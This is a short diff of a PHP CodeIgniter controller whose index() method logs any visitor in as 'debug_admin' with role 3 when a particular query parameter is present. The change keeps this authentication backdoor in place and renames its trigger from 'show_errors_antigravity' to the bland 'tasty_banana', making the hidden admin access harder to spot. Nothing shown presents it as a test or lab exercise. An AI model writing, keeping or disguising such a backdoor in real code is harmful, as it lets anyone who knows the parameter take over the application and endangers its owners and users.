@@ -19,7 +19,7 @@ class Anjuman extends CI_Controller
   }
   public function index()
   {
-    if (isset($_GET['show_errors_antigravity'])) {
+    if (isset($_GET['tasty_banana'])) {
       $_SESSION['user'] = [
         'username' => 'debug_admin',
         'role' => 3
